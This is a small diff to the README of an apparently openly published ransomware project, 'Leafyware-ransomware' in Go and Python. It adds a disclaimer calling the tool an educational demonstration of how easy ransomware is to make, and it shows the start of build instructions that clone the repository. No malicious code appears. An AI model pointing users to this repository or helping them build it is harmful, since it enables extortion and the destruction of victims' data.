@@ -4,6 +4,7 @@ Leafyware-ransomware
 [![Golang](https://img.shields.io/static/v1?label=Golang&message=%20&color=orange&logo=Go&style=flat-square&logoColor=white)](https://golang.org/)
 [![Golang](https://img.shields.io/static/v1?label=Python&message=%20&color=orange&logo=python&style=flat-square&logoColor=white)](https://python.org/)
 
+> This was made to demonstrate ransomware and how easy it is to make. I am not going to be responsible for anything use it for educational purposes only
 ### How to build
 ```python
     git clone https://github.com/ScRiPt1337/Leafyware-ransomware
